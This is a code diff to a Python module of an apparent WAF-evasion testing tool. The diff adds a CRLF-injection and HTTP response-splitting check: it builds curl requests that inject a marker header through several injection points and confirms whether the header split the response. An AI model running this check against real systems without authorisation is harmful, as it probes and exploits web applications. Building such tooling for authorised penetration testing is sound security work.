@@ -16,8 +16,11 @@ float in [0, 1] reflecting how strong that evidence is.
 from __future__ import annotations
 
 import base64
+import json as _json
 import re
 import random
+import subprocess
+import urllib.parse
 from dataclasses import dataclass
 
 
@@ -259,6 +262,122 @@ def _check_ssti(oracle, payload: str, attack_class: str) -> Verification:
 
 
 # ---------------------------------------------------------------------------
+# CRLF Injection
+# ---------------------------------------------------------------------------
+_CRLF_MARKER_NAME = "X-Waffen-CRLF"
+
+
+def _fetch_headers(target, payload: str, timeout: int | None = None) -> str:
+    """Self-contained `curl -i` header fetch.
+
+    `Oracle.send()` only returns code/size/time/body — no headers — because
+    the rest of the toolchain never needs them. CRLF/response-splitting
+    verification is the exception: the only way to *prove* a CRLF payload
+    split the response is to look at the raw header block. Rather than
+    changing `Response` (out of scope — other files are off limits), this
+    builds its own curl invocation with `-i` so headers are included in the
+    output, using the same per-inject-point request shapes as
+    `Oracle._build` (query/path/rawpath/body/json/header/cookie).
+
+    Returns the raw header text (everything before the first blank line),
+    or "" on any failure — callers must treat that as "headers unavailable"
+    and fall back to a body-based check, not as "no CRLF".
+    """
+    try:
+        t = target
+        to = timeout or getattr(t, "timeout", 15)
+        method = getattr(t, "method", "GET")
+        param = getattr(t, "param", "q")
+        inject = getattr(t, "inject", "query")
+        url = t.base_url.rstrip("/") + t.path
+
+        cmd = ["curl", "-sik", "-m", str(to), "-A", getattr(t, "user_agent", "WAFFEN/0.1")]
+        if inject == "query":
+            qp = urllib.parse.urlencode({param: payload})
+            sep = "&" if "?" in url else "?"
+            cmd += ["-X", method, f"{url}{sep}{qp}"]
+        elif inject == "path":
+            cmd += ["-X", method, f"{url}/{urllib.parse.quote(payload, safe='')}"]
+        elif inject == "rawpath":
+            enc = urllib.parse.quote(payload, safe="/.-_~")
+            cmd += ["-X", method, f"{url.rstrip('/')}/{enc.lstrip('/')}"]
+        elif inject == "body":
+            cmd += ["-X", method, url, "-H", "Content-Type: application/x-www-form-urlencoded",
+                    "--data-urlencode", f"{param}={payload}"]
+        elif inject == "json":
+            cmd += ["-X", method, url, "-H", "Content-Type: application/json",
+                    "-d", _json.dumps({param: payload})]
+        elif inject == "header":
+            cmd += ["-X", method, url, "-H", f"{param}: {payload}"]
+        elif inject == "cookie":
+            cmd += ["-X", method, url, "-H", f"Cookie: {param}={payload}"]
+        else:
+            cmd += ["-X", method, url]
+
+        out = subprocess.run(cmd, capture_output=True, text=True, timeout=to + 5).stdout
+        for sep in ("\r\n\r\n", "\n\n"):
+            if sep in out:
+                return out.split(sep, 1)[0]
+        return out
+    except Exception:
+        return ""
+
+
+def _check_crlf(oracle, payload: str, attack_class: str) -> Verification:
+    """CRLF-injection / HTTP response-splitting heuristic.
+
+    The search engine hands us a payload that already got THROUGH carrying a
+    CRLF sequence (raw `\\r\\n`, `%0d%0a`, `%0a`, etc.) — but a THROUGH verdict
+    only means the WAF didn't block it, not that the backend actually honored
+    the injected line break. To confirm, we append an attacker-controlled,
+    unique marker header (`X-Waffen-CRLF: <random-token>`) onto the payload
+    using both a URL-encoded CRLF (`%0d%0a...`) and a raw `\\r\\n...` variant,
+    then look for it in two places:
+
+      1. The response HEADERS (fetched via `_fetch_headers`, a dedicated
+         curl -i call) — if our marker shows up as its own header line, the
+         CRLF sequence split the HTTP response and injected a real header.
+         That's direct, strong proof of response splitting (confidence 0.85).
+      2. Failing that (headers unavailable, or marker not there), the
+         response BODY from the normal oracle transport — if the raw marker
+         token shows up there, the CR/LF bytes survived whatever sanitization
+         happened, but we can't prove it actually split the response into a
+         new header, so this is treated as a weaker signal (confidence 0.4).
+
+    Neither signal present -> not confirmed.
+    """
+    token = f"wfxcrlf{random.randint(100000, 999999)}"
+    needle = f"{_CRLF_MARKER_NAME.lower()}: {token}".lower()
+    variants = [
+        payload + f"%0d%0a{_CRLF_MARKER_NAME}: {token}",
+        payload + f"\r\n{_CRLF_MARKER_NAME}: {token}",
+    ]
+
+    for variant in variants:
+        headers = _fetch_headers(oracle.t, variant)
+        if headers and needle in headers.lower():
+            return Verification(True, 0.85,
+                                 f"injected marker header '{_CRLF_MARKER_NAME}: {token}' appeared "
+                                 "verbatim in the response HEADERS — CRLF response-splitting "
+                                 "confirmed", attack_class)
+
+    for variant in variants:
+        resp = oracle.send(variant)
+        body = resp.body or ""
+        if token in body:
+            return Verification(True, 0.4,
+                                 f"injected marker token '{token}' reflected in the response BODY "
+                                 "only — the CR/LF bytes passed through, but no confirmed header "
+                                 "split was observed (response headers unavailable or unaffected)",
+                                 attack_class)
+
+    return Verification(False, 0.2,
+                         "neither response headers nor body show the injected CRLF marker "
+                         f"('{_CRLF_MARKER_NAME}: {token}') — CRLF injection not confirmed",
+                         attack_class)
+
+
+# ---------------------------------------------------------------------------
 # Dispatch
 # ---------------------------------------------------------------------------
 _CHECKS = {
@@ -268,6 +387,7 @@ _CHECKS = {
     "Directory Traversal": _check_traversal,
     "File Inclusion": _check_traversal,
     "SSTI": _check_ssti,
+    "CRLF Injection": _check_crlf,
 }
 
 
